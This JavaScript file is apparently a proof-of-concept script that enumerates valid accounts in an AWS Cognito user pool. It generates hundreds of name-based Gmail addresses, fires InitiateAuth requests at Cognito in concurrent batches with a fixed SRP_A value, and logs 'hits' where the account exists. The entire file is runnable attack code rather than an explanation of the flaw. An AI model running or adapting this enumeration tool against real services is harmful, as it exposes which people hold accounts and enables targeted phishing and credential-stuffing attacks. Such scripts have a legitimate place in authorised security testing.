const FETCH_TIMEOUT_DURATION = 7500;
const PROCESS_BATCH_SIZE = 7;

const ENV_CLIENT_ID = "5b6a3***mldkr";


/**
 * Generates a large list of email addresses for testing purposes.
 * Combines common first and last names to create realistic-looking email addresses.
 * Also includes a pre-defined list of email addresses.
 * 
 * @returns {string[]} An array of email addresses combining common names and predefined ones.
 */
const fakeEmailAddressMaker = () => {
    // Pre-defined list of email addresses to test
    let emailAddressesToTest = [] 
    
    const commonFirstNames = [
        "James", "John", "Robert", "Michael", "William",
        "David", "Richard", "Joseph", "Charles", "Thomas",
        "Christopher", "Daniel", "Matthew", "Anthony", "Mark",
        "Donald", "Steven", "Paul", "Andrew", "Joshua",
        "Kenneth", "Kevin", "Brian", "George", "Edward"
    ];

    const commonLastNames = [
        "Smith", "Johnson", "Williams", "Brown", "Jones",
        "Garcia", "Miller", "Davis", "Rodriguez", "Martinez",
        "Hernandez", "Lopez", "Gonzalez", "Wilson", "Anderson",
        "Thomas", "Taylor", "Moore", "Jackson", "Martin",
        "Lee", "Perez", "Thompson", "White", "Harris"
    ];

    // Combine each first name with each last name to generate new email addresses
    commonFirstNames.forEach((firstName) => {
        commonLastNames.forEach((lastName) => {
            emailAddressesToTest.push(`${firstName}.${lastName}@gmail.com`)
        })
    });

    return emailAddressesToTest;
};



/**
 * Makes an authentication request to a service for a given username.
 * Uses AWS Cognito for the authentication process.
 * 
 * @param {string} username The username to authenticate.
 * @returns {Promise<Object>} The response from the authentication service, including status and data.
 */
const makeRequest = async (username) => {
    // Authentication service URL
    const url = "https://cognito-idp.us-east-2.amazonaws.com/";

    // Payload for the POST request
    let payload = {
        AuthFlow: "USER_SRP_AUTH",
        ClientId: ENV_CLIENT_ID,
        AuthParameters: {
            USERNAME: username,
            // This can be the same for everything, but it must be there in the right format
            SRP_A: "66463ad244621e5365841583e54891c292b3be74a00bdd034c2d555cf4fe1faaa",
        },
        ClientMetadata: {},
    };
    
    // Headers for the POST request
    const headers = {
        "X-Amz-Target": "AWSCognitoIdentityProviderService.InitiateAuth",
        "X-Amz-User-Agent": "aws-amplify/5.0.4 js",
        "Content-Type": "application/x-amz-json-1.1"
    }
    
    // Make the POST request and await the response
    try{
        // Limit request duration in case we start timing out.
        let timeoutId;
        let response = await Promise.race([
            // cURLing AWS Cognito
            fetch(url,{
                method: "POST",
                headers: headers,
                body: JSON.stringify(payload)
            }),
            // Hard Time Limit for Request to Process
            new Promise((resolve, reject) => {
                timeoutId = setTimeout(() => {
                    reject(new Error('Request timed out'));
                }, FETCH_TIMEOUT_DURATION);
            })
        ]);

        // Clear the timeout
        clearTimeout(timeoutId);
        
        // Convert the response to JSON
        let responseData = await response.json();
    
        // Return both status and data
        return {status: response.status, data: responseData};
    } catch (error){
        // handle or throw the error appropriately
        return {status: 'error', data: error};
    }

};



/**
 * Processes a batch of email addresses by making authentication requests for each.
 * Categorizes the results into hits, misses, and errors based on the response status.
 * 
 * @param {string[]} emails The array of email addresses to process.
 * @param {string[]} hitsArray Array to store successful responses.
 * @param {string[]} missArray Array to store unsuccessful responses.
 * @param {string[]} errorArray Array to store responses with errors.
 * @returns {Promise<boolean>} Indicates completion of the processing.
 */
const processRequests = async (emails, hitsArray, missArray, errorArray) => {

    // Iterate over each email and make a request
    for (const email of emails){

        try{
            let result = await makeRequest(email);

            if(result.status === 200){
                hitsArray.push({email, ...result});
            } else if(result.status === "error"){
                errorArray.push({email, ...result});
            } else {
                missArray.push({email, ...result});
            }
        } catch(error){
            errorArray.push({email, error})
        }

        // Short delay between requests
        await new Promise((resolve) => setTimeout(resolve, 25));
    }

    return true;
};



/**
 * Splits an array into smaller chunks of a specified size.
 * Useful for batching operations like network requests.
 * 
 * @param {Array} array The array to split.
 * @param {number} chunkSize The size of each chunk.
 * @returns {Array[]} An array of arrays, each being a chunk of the original array.
 */
const splitArrayIntoChunks = (array, chunkSize) => Array.from(
    { length: Math.ceil(array.length / chunkSize) }, 
    (_, i) => array.slice(i * chunkSize, i * chunkSize + chunkSize)
);



//////////////////////////////////
//
// MAIN PROCESSING / ENTRY POINT.
//
//////////////////////////////////

const start = process.hrtime.bigint();

// Get a list of fake emails (and 3 or 4 real for POC), and shuffle for faux-fuzzing
let emailListAll = fakeEmailAddressMaker().sort((a,b) => {return Math.random() > Math.random ? -1 : 1});

// Splitting the list of emails into groups of ${n}
let emailGroups = splitArrayIntoChunks(emailListAll, PROCESS_BATCH_SIZE);

// A Global Array to store the hits, misses, and errors...
let hits_array = [],
    miss_array = [],
    errors_array = [];

// Processing each group of emails concurrently
await Promise.allSettled(emailGroups.map(group => processRequests(group, hits_array, miss_array, errors_array)));

// Here's everything that landed
console.log(JSON.stringify(hits_array, null, 2));

// Here's the errors...
if(errors_array.length > 0){
    console.log(errors_array)
}


const end = process.hrtime.bigint();

// Log duration and count processed
console.log(`Execution time: ${emailListAll.length} emails checked in ${(end - start) / 1000000n}ms`);
